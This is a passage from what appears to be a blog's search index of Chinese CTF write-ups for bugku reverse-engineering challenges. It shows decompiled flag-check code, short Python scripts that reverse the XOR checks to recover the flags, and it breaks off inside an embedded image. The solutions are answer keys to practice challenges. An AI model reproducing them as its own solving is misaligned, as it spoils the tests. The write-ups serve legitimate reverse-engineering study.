&quot;);scanf(&quot;%s&quot;, v11);if ( strlen1(v11) == 20 )&#123; for ( i = 0; i &lt;= 14; ++i ) v11[i + 4] ^= *(&amp;v4 + i); if ( !memcmp(v11, arr, 0x14u) ) puts(&quot;success&quot;); else puts(&quot;you faild&quot;);&#125;else&#123; puts(&quot;you faild&quot;);&#125;return 0; 输入flag之后与v4字符串异或之后和给定的arr字符串比对，逆运算可以得到flag。 需要注意的是v8,v9,v10是int型，占4个字节，并且byte2（v9）把v9的第二个字节赋值为85，感觉写脚本逆运算还不如手动解，所以爆破脚本如下： 1234567891011#!/usr/bin/env pythonimport stringfinal=&quot;this_is_flag_gg&quot;key=[28,13,59,22,0,0,0,0,0,0,85,0,0,0,0,0]flag=&quot;SYC&#123;&quot;for i in range(15): for ch in string.printable: if ord(ch)^key[i]==ord(final[i]): flag+=chflag+=&quot;&#125;&quot;print flag","categories":[],"tags":[]},{"title":"bugku-re-1","slug":"bugku-re-1","date":"2018-10-08T11:03:15.000Z","updated":"2018-10-22T02:35:21.897Z","comments":true,"path":"2018/10/08/bugku-re-1/","link":"","permalink":"http://yoursite.com/2018/10/08/bugku-re-1/","excerpt":"","text":"游戏过关虽然ida打开之后函数很乱…但大佬说过用ida都是可以做的 搜索一下flag试试，直接找到了生成flag的函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122sub_45A7BE((int)&quot;done!!! the flag is &quot;);v59 = 18;v60 = 64;v61 = 98;v62 = 5;v63 = 2;v64 = 4;v65 = 6;v66 = 3;v67 = 6;v68 = 48;v69 = 49;v70 = 65;v71 = 32;v72 = 12;v73 = 48;v74 = 65;v75 = 31;v76 = 78;v77 = 62;v78 = 32;v79 = 49;v80 = 32;v81 = 1;v82 = 57;v83 = 96;v84 = 3;v85 = 21;v86 = 9;v87 = 4;v88 = 62;v89 = 3;v90 = 5;v91 = 4;v92 = 1;v93 = 2;v94 = 3;v95 = 44;v96 = 65;v97 = 78;v98 = 32;v99 = 16;v100 = 97;v101 = 54;v102 = 16;v103 = 44;v104 = 52;v105 = 32;v106 = 64;v107 = 89;v108 = 45;v109 = 32;v110 = 65;v111 = 15;v112 = 34;v113 = 18;v114 = 16;v115 = 0;v2 = 123;v3 = 32;v4 = 18;v5 = 98;v6 = 119;v7 = 108;v8 = 65;v9 = 41;v10 = 124;v11 = 80;v12 = 125;v13 = 38;v14 = 124;v15 = 111;v16 = 74;v17 = 49;v18 = 83;v19 = 108;v20 = 94;v21 = 108;v22 = 84;v23 = 6;v24 = 96;v25 = 83;v26 = 44;v27 = 121;v28 = 104;v29 = 110;v30 = 32;v31 = 95;v32 = 117;v33 = 101;v34 = 99;v35 = 123;v36 = 127;v37 = 119;v38 = 96;v39 = 48;v40 = 107;v41 = 71;v42 = 92;v43 = 29;v44 = 81;v45 = 107;v46 = 90;v47 = 85;v48 = 64;v49 = 12;v50 = 43;v51 = 76;v52 = 86;v53 = 13;v54 = 114;v55 = 1;v56 = 117;v57 = 126;v58 = 0;for ( i = 0; i &lt; 56; ++i )&#123; *(&amp;v2 + i) ^= *(&amp;v59 + i); *(&amp;v2 + i) ^= 0x13u;&#125;return sub_45A7BE((int)&quot;%s\\n&quot;); 两个数组每位异或后再异或0x13得到flag，脚本如下： 12345678#!/usr/bin/env pythona1=[123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,90,85,64,12,43,76,86,13,114,1,117,126,0,]a2=[18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0,]for i in range(len(a1)): a1[i]^=a2[i] a1[i]^=0x13flag=&apos;&apos;.join([chr(i) for i in a1])print flag 逆向入门windows下打不开，显示版本不对，ida没用，od也没用，用hex fiend看了一下： 1data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAYAAACAvzbMAAAgAElEQVR4Xu29CdhuyVXXW4dAmBIghqEDCIg5aWQmAyhT0oCgkj6CE4HjdT7pgHLVpGVwgsP14nBDixMGGofHxyYRRzodFS7Y6SBc0SSAECA5DDKmQcKUMKPnPr/vPdW9z9t77/rV3uutd7/fqXqe7+nkvLWrVv1r1frXsFbVhevXr19PPXUEOgIdgY5AR6ASgQudQCoR69k7Ah2BjkBH4AyBTiBdEToCHYGOQEdgEQKdQBbB1j/qCHQEOgIdgU4gXQc6Ah2BjkBHYBECnUAWwdY/6gh0BDoCHYFOIF0HOgIdgY5AR2ARAp1AFsHWP+oIdAQ6Ah2BTiBdBzoCHYGOQEdgEQJVBPLmN785PfDAA+kNb3hD+omf+ImbKiQe8cKFC4uE2P/IlBWVZ0rg22+/PT3taU9Lz33ucxe16TWveU3Kf0sKOHT7DOaRGDzjGc9Iz3nOc84wPVTKeKOfue/e8z3f81DVhZW7dlwZXUFYk28sDxhmPJ/4xCeGtXu/oJe+9KXpjW98YwKPNfVhm7Kdohx0j78lKZfz+te/fsnnizE343ORQBMfLe1jTSAMyrvvvvsxxBHZiC2WheK9+MUvTjUD5+rVq+nlL3/5FpuzSCYG4Vd+5VdWYXDPPfekr/mar3lMfc9//vMTf9Fpqr4XvvCF6bM+67Oiqwsr75TGFUaGsRA9CQCDL/7iLz6bmA7TkvoYd4y//YQOoAs2QWLYOyYlt1KqxVwRCGBevnz5liOPrDh33nln+qIv+iKlR1/1VV+V+DtvCSKFREyaGsT5W4wQq5GoVMIcuZfOQKNkHCvnFMcVE6n777+/ajJRwhDjvk8e+ZuayQvG/q677pqsrmbyct4mgaU+2Cfu++67T/WxIhBmkszwbuXEoDHbIc985jPPLUzWEF+6dGl2sgGO4BmVSpg//elP3ySpl4gvCp/ocmoMcanu0mSD75m8MYkrJeR67WtfO5vt1a9+damYM91Fh2/lZFfuikBYXrIXeCsnM2suzYBOHT+jVMyq77jjjmJTzUAuFpLS2czVbFFF1Wdksnle9KIXpYceeshm30y+Zz/72enLvuzLQuQxJPqZn/mZCaxKCb1D/+YSk+HSFtwrX/nKs+2rWzlx9ovdLyVFIIbZSxWd+u9m1tUJJJ0N4JYEYmaw6J5dQbbU01MdV5ErSIOBXUGyLfqWt7xlNYEYUmupJ8eoy2LeCUT2TieQdHYoXpq9ASfbDXjTTCXKGDtgl11xUzZmwnjvlJJZQZbKiP7dGM/oOqPKe/DBB9Ueeak+i4FZQZZWdE94whMSq4tS6gSSUieQkpZU/n6rE0jNtkVpC8CepZS6iL1qtq9Ks07KYdZsDwZL9Ub9bo1nVH2R5dQ4lszVazEw46+0nWm2YJG1E0gnkMixclaWUeDzuoUFebAfWuPKzAqDgTg07swAmSWaA9FSB065fs59xxYHB7I17SjJseZ3azzX1HHIb82YKNVfgwG6w3nIXGLygq7uTypqZO0EcmQCwVCwTUEg2lYGa1Y6Zq38lbw19pXUKOASAgEn/oyHV2kw8jttw7hOuUWaMp7ylKc80n9rgv+QhQHNYEYnKGusncjKlpcN1iK/2YoYayv6mNuEfl68ePFoOlpjPE2/HSMP/ZnxzLpcI0ctBtSB112ua2xLlXM49AOdmtO7KTmXEAhbPmARNY5rMJzLCxaMK8aMWannso62hcUMAaXYGnHsg4xxw9PCGtpoAsFIs39vzhSWKBNkxkxs7ixiv1wGG99ExmiUlPvYwVroKauSVm0e4lFrPJfoQetv0Gd0yOr1Wgyoh/OtSMNdQyAYWtobWf8h+gwioV3mvJD6j0Ig1t3uEAAtKRNQ2UM3RjaSQDDUeA8dmmRrzgjAL+pswvbFXACZLSMq3zEO2dcaz6i2R5eDXnPeZIxqBAbRwY2WQGqCHKMxXlqedTppTiCtjOJS4Ka+Kx345u8iCcQGRkW01Q4G6/cdIRNlbC04FSOEZ1HLFGE8W8pbU5d1uojCIFJ/7Zg5xqSjpg/G8jJp5gyytJ3VnEBshWsBOMT3pUhm6owkEOsOG9FWey7TktQynrXnUBF4zJXRegUWZTwPjcuS8i0hR2EQ6RpuCcS4Fi/B7tDfGMytPQ+LAzEG9tDALC2/NYFE+dCb9tprGbrx9FdmGNxNHjOQTTlbzWMMrN1SMW009ZlyzjuBGMw7gRhNuZGnNYG0NNaRW3QVkBazbvF6nNZneEbvikBuNINdEdibBEwzo8bVeScQ075OIEbjjkQgePywf9oicTupuZK6daCd3VprgVGuo+U53tbOgKJxtkF7dk/eyBcV3GgMLPJErXhM2yLzmPZ1AqlA3MwEzRZdjVFsceZgFGUIU9QAtNBv0Yi2CDbEdRxiL138Z3HcWr7aA+2p4L8l7YoYV3bcdAJJqZ+BpHQWmFRK0QRCfRgrjDbBbMblsSQjv3Pmce3atTMvJ7Py2C+TrQfca5cEhRn59vMgI7LiSm1jcpbUU/MNfUF/R2IAWdAvGMuoe8Bq2nTovMQ18YfuLImpQW8x3GuDYCPGVSeQI8SBGAOblZjBdO+9954Npv2ncdcqOoOeveya6zKORSBr29rie4xBNqY19eU+Zo+b/41XDn1y5cqV2fgXdCIbkpr6DpkXneIajSWPUtEWnkJYq+fIQD9k44yhBVsbGDbEJ4+PHOy3FPN8NQ0yRcc00T62edd66uWbB9hSszIegkDoJ/orepKUbwIojath/5v2bXYLC2PC8j0ayH0DUnMg2gmkbH5rfN7nXtozwVd8j8FeazzKrarLUbs9EhUoOTeYaw+h59pQ4xXW6rzIeAyZXqwJbjQGljrtFlZUG+baacZV/t60b7ME0gLMDJT1yugEUh6CNdG+JQ8rQ+7W/bgseVyOQxihknQYara85rY4S9eY5zpKwX01NxfYsVVqn/m99DyAKYM89llmY2AtgVgvSNuGuXxmXPG9ad9mCaT03GkEkLkMe5jXCcShblchJTxbB5m51rlc1ruoxeojS2yNlFlB2VWInX07VOdzGYNn6zExWLY+g0FpMmXlNvnsQ1+mfZslkJJxMUDZPBYEI5M546nxwrJt2FI+g4FdOZjB13K1anG2szyjU6ZOU1/pHYxcj7kBIdK4mPaZPLXbdHNlmpWTwcCuQCwhGxxMHjOuTPus7WzuhRU1sAyYFgQjU6TxNLJvMU/UCsQOvkjDEYWn0QPqMjplZDKrBlufMS7G4NlxZdpn8hiDZ8ohT+sViMHTym7ymT42eNo+7gQiB7s1HFFbF0ZZWuYxe/FZntKevN1arNmTb4WFfVs9gkBqMC9tlRjMbVCfNS5RfRI1pmx0vDGwdhLUCeTGRYIljxhrYCMGllVMq+hGJts+thPIW7rt0rZhK/ns3j/yzhmiWu+dLQUbWh2wK4JS37bGnLdZzENddlyV2md+t8a8VBZ6R1nmnRJbp5ntdwLpBHKmmzXGI8qHvTQoWvxOcBgritrgMFYPzIqHE48lT+PSxshI5SWYLXmK10xKpmRZ+rDXmPuzefCIvrp69aoOPG1BIDmOKCLoEnkhR0Me9EknkA0HEq4ZWLWD3yq6kamGQIZyLokGr23nfn6esCR4bUmsDYSB2yQujww4G3w1JzMYLAnC2y8To0KbcvT6oVZ5GHC2TZAZPJbcEmB0KrdvWF8LzCEM9AMcwbP2ShU7rmr0GBkItsuR6GsCL5GPCQ9PFi/Ru04gnUDOdNcquhnsSwmkZhBF5y3ti+/XB154PkWQRnRbxsjkEMGGNQFZc200OpV1tCXmOCbcc8891aQxbKsdV1YHIA1WCGtII9cVMU47gXjb2Q/Rgw/R7aBplc8eQDLTZrvgFMgjY2cPfS3WNYfWpTINgdSeB5XqLP2Ogb58+fIq8qiZmJXk4fe5WwvM98M8pUBJW14nkE4gfQVyY7TYILOImZsdoJH57GA3dRpPJVMOeQyBtMY8Kq4mcgUS6aptYjxM/1md6ofoR7iN1wws08kmj1V0I1PrwW7aZ/LYwL6owWdkisxjCdLUWeP1VCrP6JSNqynVZX+P8giy48rIFUVq1GUMupGpE0hfgfQVyGCkGGNm4xvMAGyZxxKkkSmSRA3mkfWZ9kURiL0yw8hkjXWpLLZgWc1EJCuTIawozG27jEymfXaS0M9ANrrdYBXG5CsF9rEXb/z/TV3HyIPHTYRHVqRB3yKBRMbUmIhuowtRK8io8w9kNgbWrng6gfQ4kLNxcKpbWMheuiup9VaKMSw1eaKM0HknEA6scarg8a61KfJZ5tIEpyRrpPNDJ5Ad2n0FUgGCmS2eMoGgEGPBeAw82oVROfXE7JqZ45qVyHknkDyZwL17SYzQvo6gNzUPGU3pGMSGTA899FC1GrJ1xbdL4j2mKusrkE4gVSy6dQLJwXM24Iv2MIPYT8NAvPxc65IguepRHvBBDjCjDQSIjbWP85Ccj71g/ncNodwKBJK7giBC/oaYLekm9CfrEnrH88xLXcHpL/rN9llksOuw7Z1AOoGcCwLBWHLFxJLzCQY1MzN7fcMS49Him6krLTAe3FQ7R4Bj16nMyXwrEcg+DtZolvqc/qBfIlcEpTqjf7dYmAPrfgbSz0DO9PMYW1g8/bvmKpSaVwSjB2FUeRDolHeNuV21Zt//ViaQmr1/07fm7RFTzjHydALpK5CTX4FEBVhFBse1Hsylw3/kMbEb9pD9VicQ8Ix6PjbSK6q13nUC6QRy8gRilbg0uKw3RamcY/xu3E4NQbIKueOOO4pN6ASSzm5eXnKYvQ+ufba42ClHyGDHXt/C6pHoZ+q5xUP02osQp8ZZZIBV67FsBrKd6ZqZdScQHwNhdMEYWFNO6zxG75DJtK+fgQSfgdjL/SKUxrwnvVUCMbNvg5E1sKas1nnM1pM9mzIDOSo4zupUJGFF9Q1nbpy9rU3mfGptHYf6PpJAIq9qKbXXYm7aZ3cumkeiR+3tl8CsCS7a4gqk5vB3DotTPsykXXMTjprbbEuG0WyFlXRu+LvRqS0SSAlzi8EpB6caA2tXIC2fZcb7jZV2KZn2bZZAaNyhWbn2BTkz2O1Mt9R5Nb+vfR7XKlSNTK3zggH78vvR0/QxelTjLjq1qjvEOyhGp7ZKIFOY2763K39bXut8xsBaAiEfk2Z01ca3LGlvDeamfZsmEABiRgiwEY/IDAEnyAwwawLkzGBfSiClt+Sz7GOBcfyWX2oz+625LDBgJnLqMSC5PWCAruR4GPqLFcNUH2MAp9rOb5TFq40c9HIlh5m11Q5qo1NLCWRfp65fv54uXLhwk4gQ7Jr+z5gzTm0AK/2RX7OsxesQ+ef0YK4+Y2BrCIS82DleXETvItMSzE37Nk8gkSCuLcsM9hoCqX1jOsvPbJrZ9pqBvxaLU/1+DPOoqzaWYGJ0qoZAMOTExNROuCBIVqJLo8OXtP2Y34wFnpqg06HMxsDWEsgxMdmv27SvE0hFj5nBbgmEWQ+HkHbWNibmqZ9bVEAfknXupb2oJ2prBTU6ZQnEOBPMyXceAkoN/ow5xt7YPV9gAN5mcmYMbCeQXY80P0Q3itA6jxnslkAivMysN0VrnLZaXwnzmv3hqDYanTIEglG8dOnSqgkJbYp2EojCKbKc0tmqHVedQDYcSBipMFFlmcFuCMQGrBm5T/WBJ9O2yDwG88gHkKzsRqcMgZS8x6w8pzxjtm0sTSQox7hqdwI5AoGc8gzHDHZDIJGD3RgXO7DOcz6LeY0TQgReRqdMH1tjZmQ+75OS1pi31inTxyaPCVJufgZiKzQNbJnHzGCRpzWBnPfBHtXHnUA8kqdq8GwLWxOIWc1Y2VvmMys1a8/DzkAA4BSNno34bkkgdq+2pdJtta5OIK5nTnmHwLXQXUkUueozF3la2Vvlw+GEM7VSOgqB4C5HBOqpuAzWeEy1IhD899m2MN4iJSW4FX7vBFLuZe5DY6J0KuOy3KLxHK1XIDWeXUvbFPndnJfafj1HIRCE4MCSWAbuYNpqAsgHHnjgzFBbd9sWBAJmYFcTBLlVjFvJ1QlkGmkmI8SBoFPnnTxAoTWBUCe4YhtY4W0ZY25YxkvNxhEdjUBaGY7W9RyCQOgk9iNZbUyRBh1+7733PtLxRJk/73nPW0QyxBNAnJSJshM1jOLXphwdn6OUc/T/klUTq0AidLNis4rF7dYOxkMQSATmxzBm9CP9CWnM6dRazIf6gj4R2Y9OoMO5/lqdAvOXvexlj0RqUxbvrddMpo6FeW1bTyF/J5DgXoomELN/isEn+nh/lbRk6Tz1sl/ttiPG5+677x6dydTevTV1sSZG4yUveYkyHtEEMoc57cM4m3QMY2b29yMwp/3oJHow9mImExOwsmlqKxk93zrmto2nlq8TSHCPRRKIuWK9FECGkb3vvvvUTL3kKFATaFfy4LBR9KXXBiE2DGIpRRJICfOaiO7WBGL0s4R5jfNGKWjPTJAyEc0FSm4Z85JunvLvnUCCe88MUGvMzEyxZPRpnp3xl4w+ZRkXT9M+S0bGF93gZGSy7TOYW8PYmkCMS2kU5ua8wZKRed5hq5gHm5hNFdcJJLg7IgkkarBbY22MmVk5GANrFc+QmiHISAIxBjYSc0OQJpCQw/J8U/Gc2ptHtYyxLq1ksgxmUlJayeRzHfqmlIyeR2FekuXUf7fjWMWBmE4+dcBK8hvFs8bMGGtjYE0nW5mMsTaX+pntOTODJY8x1obUKMtgbgyswZz6OCspvf9g4qYM5lYm0z7zEJTVKUMgRibbvigCse0r2YxT/t1MmGmfIhCzzDxlsEqy25fvrOKVjLWNjkfu0mrGzGCtsTZBSGYGa4wiMpltELNqMNt9kZhTH66zuE5OJftWfRTmmUTvueeeWXU3pGb1/FQJBF3AEaA0ASjZjVP+vWSjctsUgZDZzBROGbA52Y1R5Hs7sEoHg3i3mC2JkuGfu+Z8rL1mlTVHSMbgU69ZXWX55rC3eFNWJOasLpipz6XSU6YG61x+CXPKsm7Pc9jbWafF/VQJxJLtebV3dhdBr0DICCuzlYXf962SWHkwqBh0JtmBlWfXzJ6HsRNgjLutJY8s09jDSUseILJuk2MGzTwLu/ShrTHDNuVuO9dPeK5h+PcxJ86GLa6aZB6r4qyAPh6+T4FO8W/WHTjLhHzgPpwVgzll1cRKoGOsjvZfNbTkUTNROmUCySSyj3mNjpxiXraN0QU7IdErkAwGRoABMfZoyykCNiUzbqQYGgtkzcAa1kkdBOJlXG1k/L7cyJmDx3g2c03/5HL4bw5K268POakDuZF/LIiQ3zBU5EOmsZgBqzMYyVxHrtd+u58vGnN0BfmYuY3pSw645LeaN9yXYG4xyX2ScT2Enp86geSJM1it0V3bJ8fMx5iYCz6dkq2aQI7ZyK3XXbMC2XpbhvIteRaVczP225cS4inhk2XFCLPCWUMSp9Buq+fngUBOoT+OKWMnkED07cAKrLJZUWbfPwtjD8mbCd+wIkiEAM+abaWG4oVUZfW8E0gI3JsupBNIYPfYgRVYZdOijCssAhFZbC9ta9qARpXVHEI2Eim0GqvnnUBCYd9kYZ1AArvFDqzAKpsWZbzRatxhmwrfsDLrjdZQpNCqrJ53AgmFfZOFdQIJ7BY7sAKrbFqU8dTpBLLrEmM8m3ZeYGVWz01MiYlTMgGlNM8Eb9pVdCBc57qoTiCB3WsHVmCVTYsyBIJABGG98Y1vbCrb1iqrifPYmuwleayem6h2E6Rsg9pMrNp5JvZSvx3i904ggajagRVYZdOiLIHY60WaCt+4MnubcGOxQqqzem638uaCG2teUyzJZfU3BKRbpJBOIIEdXVLgwKqOUlTNAOz3p+0i7jk3Om+pRs9ZjYLBXJzJWMAlmEEe6FHNQ2VTk5fz7thwLB07KoGwX37t2rXHtP369evpwoULs5hM5SE6d20i+O22226rdsWsGVhZRiKTawaIadt+lLH5xuSpIRDKAw/+2DbASKy9WwicwMukqPqoa21QJnvzXPS3RKf224p328MPP3zTP5vxwgdj+ZboX62e55cKCTi9ePHi6LjCFrCdlbGmryGfMeLJGFDW2O+UgSs5was5yHUq8n9srFg8x/RwSiajszV5xvSg5vv9vEv0gDKOQiBLr7SwAJlrJvbLQoH3r7SwV3vksmoG1tIrLSwGDCCuuVhrtIf11RLIvqzgg0y15yO11ysM+2NpfVz3MUxRKyoM4/4VNqZPl1zdYsolzyH1fEwGCIVzjdqAy7HreZYEuSKTOby3+O3nW9rHpr6p1Zr51uSpHePNCaT06ptppMlTuwc9tw9rDgORyRII5MFS+9DBZvbdBoMneWqVa6xc+h+sLYmsrbP2ZtU5V+XIs50ab6BWgZnGTbtGz0t6VeNoMDe2al7nRKaay0pLbZj6/RABpdHjeUp26/V2lBWIvX57accNv7PeGyXDULrJtXYFYgdqBAaRM621xjy3xxpEe+V5CSfj6UMZ5tC35ibhOblMXXzfasKVVyImit5OlEr9wrjiOQKTSsGp1uhZ3TMylfLUTmJL5UXpXqkefrfk3nwFcscddzS7H+m5z33u2XZBKRn3PwOoHVg1s8+S7KXfrUylcqJWILke8/iP7b+S7OZNDdu+SEIuveWCTJH9V8LJGo5Imcy4MjNvS8hRW5EGS/JEug2bMWPlKuWzk8XmBNISBPuSmWF2s41lB1akUpUUgd+jMLdKZWQyQV+R9RkMzMowcgZrjGdpdWywrsljMLd6buo1uwR2BWnGlZksGrltHtPHpixDoqYcm8d6rZ1rArHL2tLrcdEzM6PotqNNvqjAPkOiRh4brW6VuFSnHXxGX+xqpiSTXfFEGusomSInJQZzu+ozK3szcTE42TxRBBKJuZHdTCQo51wTiO280qzSLo/tYG9NIHYAzilWTUBXSUHtrNqePZXqs+23h7FRs1irV2aFXMLA/m4Nh5l0mTpLelXjdFEio9I4N/LW5rE2yJQbhXmprhonn3NLICVl2gdx6nAfMDFAJlZjqwRCW9cYITBg77jW7XJMUVkN3HXXXfocrOYa+bH6bJ/kb1mtsa0yl0rP1ZYG6PB3E2wIZhj2SJfsKRktgdQY9hIec5jzQidbWDZNrZJrn3e29ZXyRRIImDN21sQlleTld7OtmMs5dwTCuQeDsvbJUABhhsLsmOAiZkbZn9u+1maNVesVSO5siJA2WgWEOCANZj5rXY5zcBcy1Cb6gYFD39q+OHR9+Yln+ty6JE+1G4xp31wQGgYQEqdda+ubw98SCGWAAf0JBlanpuoe9jF5CDCGDJaUy/jHAYMywe2hhx46k/MYj5tFEkg05sO+yIGE6GHNRPHkCQRDj4ErPceYFR1lByD+GCyR6RAEwgBC9mGELnKbFVFk24ZlMRB5bXDt07mHki+y3Pzk6xzm+XlfJh8YqzUp18eB/lrSzjcB1JB2DYHst5P6mKC89KUvXQPBZr7FqGJbiGbHzjAGa/s4mkA2A84NQU6aQDCidNDcrHRu2Rftpx1NIHPeJ1EH2rUKWbsFVVv+lvMbzK3HUKmdkc/j1myBrSGQ3KZjnDWU8Kz9fc622DM86uwEUot8Ib9xpzRV2oOekt93xIDJ8kYSSGnPNuqA2WA9zLPmLKW2rq3lt9HFUYed9lDf4GSNXtR4sI4LRvZj5Cl5dFlHik4gwb0XRSA2xqNUH4OUh28iUiSBmAFYc9jVsn0RdW21DBMrYvXAtNGsekw51nU6ikCs67SRvXUeY1vsKqsTSHDvlQy6rc4oulXiqENtazhMfebKF4OBxdPks7NYU9ap5jHefdZYGwwi+9jEQETWFzXWDU6RecwNCNa2dAKJ7Bn57KSp0s7MjBIbg25kMkFm9n4nswKJHOymfXbWZco61TwWc6N3BoPIVaaRyRhPIzd5TH22rJb5Ivs4yra0bH9NXc0P0aP2h817ywBR2quMinbOoJeivu0ANauZ0j5tjSKYvJHxD6a+LeaxmEcZT6vnJayMPlFG5JZuFAaltkX/bgmkZMvMVli07K3La04gEUbI7ENnIOeWmvYgvqZT5gYq9eGlY2MZ5raxzFZKjdw27628jVWDeYTxtIas1HdsqV2+fPksJsKkqHojMDDyRuex7S/ZMjvZiJa/ZXnNCYTGLX0UBQNM5+IJVJPG6jvkoy9jDycxG4EQan37x7ayrILXYFSTFxLEu61FZHSNXIfMW4v5GuO5VM/H2r90rC15lG2//jUYHLIvS2XX9HVr21KSvfXvRyGQ3EgYvCaqtiZCcgzIXB/nEGOGnJnaAw88cEZw+7O1sWcuc4AR21JTT2tS5lR9NZ0NKZGmMMhBYzlfTdnknWofREv7poxTDiaEVJYQCsaSbb9SIGhNe3JgHzLV6NewjhzJTB8v0bsa45kxQE/m6kM30cv9Pp56gpW221XHFL60PQc3Tun51Lc1GFDGEPOa/p7LC1acQ9Q881xDIPu2LGKsl9qexzp2ykTX58DpJXpckuWoBFISruXva54MZYBxqH+M6HAUiPuCkP9QCcWjfaWATfaEawYq50+syuyWXm378nUjGF6bolam1nhSH9jOrUxpB6/oLZ0c2LaX8tXqeQ0GS575Lck7/L1m63UJgdTIsiYvN0DQliVp6fO/c3V1AknpbJbGHrFh8ykwI4O+apSjFChZU9ZcXhO1X/N8bOkW1ii5KafkSLFvaCImAsZ42jO4Fk+wWrxr9NxgQL2tzgqMZ2PWl+hrjiy+c/lqSHCqnJpzPCNzJ5CUzmbBNbPUKWBrDvdN55TyRMYblOrid+PTbgdpS6ysB5L1kDNYGeNpBrONNzAyReWxM3SDQSTmpn1GJts+U19knqjXXKM8+2hbJ5DKGeqcQrQeDNYwRimxMfpWJkNGUXJTjjEcpn1WJlOfiWWKulvLym3yWdd3g0FrY22u4mktk8HcxGOdw2gAACAASURBVJiZcuxE0JbVCaQTiNWVs0PO0hvzdlXUOsCqFJ8TObDsqsGQqF3R6U4MyGjjG7ZIIGa3oROIV5JOICmduaRGXEEdOYM1XWiNtSnL5LEv6JWMtS3HyGTzlIK+KCeK1GzEfieQlOxqxvZzKZ85RzD9UqrnEL+bq2hMvQ8++GCY40onkBuH6Cxtl7ih5g47hlGk7tYzVHO1RsmAHmOAloK+omadNUF7BofW/WsMUOQKJHLlZ2Qvvepn22bqis5TGlemPnPuZsrJeTqB3ECCbQdmqUviBqJcP2s6bpg3agVl6sflFhIpvfg4ZvjyAz2sUI6RGIBsYexPFKIGVa1LdSeQnRZEvn1i9GoquBLyYCwdyq3cyFbKs2ZCYbagS/Xv/34wAqmJB8jPKdYKn/MzcHkCcz9NBVhN1Uc5+clXAuRKiT1eyKNkTEvlRPyen3BFbuuOXNNH+zLmdhP4xlOsY3EMzPrBE4MN5uA0le/hhx8+q4JBfMiU+zhPFJBpjdsuGOZgStpqsaeNxyQQ3Kj5I6E7NatvO0s3ZyDDvs59sf/d1Di2ejKlU8PnndeO44xhpC277bbbZsfVWMDzPiaQIWN0rZ5PYR1OIHiNEOxSM5AQDsPCzLY2WpKziyXvHR971WCV/5D5MPDMyNcQSZZvSZDS2IwdhWc7iVXBltOawNPcrmMQCAaOPh9OevLb5vYc8FAEcqj+tqvmJfWPrWbW2DJWQPukil3c6qoolEDMAVWpk2qCitYs55DDvjBXkvnUf68JtJtra+050JxLZWuHhJo+jNiLPtYKZG582a3QUyOQGsKu0YNSAHKULTNBvDVyR+YNIxBmMZcuXapeeew3xhqhKL/o1l4gkZ0XVVYUlshjDX9psnGsJ3sNplEBXa1XIKWzHsYwpF46BzxVAom8qh49KXn2WcNvxp9xXjG6G50njEBsAJlpgHEzi5oFIk+U+6Zp21bzRLkIWkI2qx5jYFvjGannpn1rV9lDfEzgYskoUt6pEgiyR0ZhmzMeY1tMsOghDsAjxk4YgUQa9NYDy3RyBNhbLsMYdCO/neWZ+rY46zplAokaV5ZASvFARp+i8xgMbJ2GQEx9ZpJgd2as7FH5wgjERt8awaNAN3XZJ2ZNWaecxyixbZ9ZQZqIYKMHVqaofGa7wdZl2hfZL6Y+MxG0MTNmkmCxisoXOVlsSSBb3SkJIxAaGKUwRtGjBpYdDFEKvNVyIicABtPSTH6rM65T1XPkNuOqdA6CFxdjz7g+GzJqOR7s9qqVqTWB2PNFK39EvlACYXZ21113FQ/hSoIbRY8gELsUL8l7Xn43e7G2rWv6kFUhHkHGSFl5IvOVjKytaw1Gto5hPlMf+ZlMMAkYiw2p3VaMGKdL2rr/DbpE+yPdYVsTCLLThi2Ni1ACodMYXPiT174CVqvoSxUzB/qwP3usiOiIAXGoMjAeKCn/LXnjlGTIGBNoODVwWYngkUV9+UU+jFfkQC/JueT3rev5WJssgeRxDInnV+8wWkwOlxgvViJMTiJ0qravmCRi6A/xvkdrAsltpy3UPTeuanFamr+KQBjsGO7h86o0Zi74D6VBeWyQkl1q1xBIfmN6KhI6g4eMWdExYLSLZWPtO+ZLO2Psu33Mo8qmTbl9c8aawQ/W9OOaRH3gf+XKlWpyoG5kqHl1kfrwXFliOE5Vz0v9U0MgpbIyyRA0DF7sPqzBfL8+ykTeJUGu9Dl9Pzdu0SXGe7Zl6Cbf1RDksQjE9M0wzyFtmSaQOb99s6yt2R4xim4JxL76xrOwyLifjrlsrMGsVqlyfvvCnHHvNDLUbiWs3UevPUuZw9zoeY28kXpusDf1mXIyeUzFfdViPlencbYYfm+C9+ZsmXF1zvWdCoFkeQ9hyxSBlDxPbES3NUJG0S2BRAz6yAFhB2gJc1uOycfsi4Ezl2qeqy3VWQpoy99HBaeaQ33qLEUWWz23Ed2Rel7CnN9NfaYc8pSe2bWYl+qrOW8ydZacRWoCWE+NQMA62pYpAjHG2hjqkudNViaj6EYmyjNue4bYjEylwVDzu21fTZlzeaNwMvIwSHH1LaWoFZgdNAZz4wlzDD0vYRlNICXjaeOBjNymXyjHrD5MWcaWUV8JA4u5kcngZPMYnGxZikCMgTWzyhL7RxOINRzmmUurVBb4Uj6DeamMmt8NQUYquokViazPEKRZORg9tw99tcbc1Gd0xhKkwdzUZ7cFTX0m1MCsZCyBGGMdqecGz0hbpgjEgG5cYq3imQYapbLh/6Z9UYPPdDB5Wkfxmpl17X702hWP6ReDpw0WNQPZGhfTf4ZE7ZgxOETpsCFIi7mR20w8jf2hLtPHZixQlrn+x5CasWUGJ5vH6rApL4xAqKw0IMwML3dMaU++9MIc5dgDsdJWCQfxNR5ABvi5PC3PP7IcpXOQmr3oUvsNsR/jzMUYKnuXUknX7eo4EocoAqF/S6t208clPRn+XiJkaxQNIds+Lk2oLKkZW1aDVSmvxapUDr+HEsjc7ZOm44YCG+M/Z/hro07nZrtGFgO2zVManLac2nxz7SwZRFsXZEy/leI8Soe0tj5mwmwjlOrL5c3NUGsGXolwzdZGlilqhhpJIHPBhrWYm76csx+WjHM9c7pc28cQ21jApfX+zDKVbqc2GNk8NW0slRlKIFQGibAFNfTBXvrok2no2DOl5rt9YMYe1WEgMM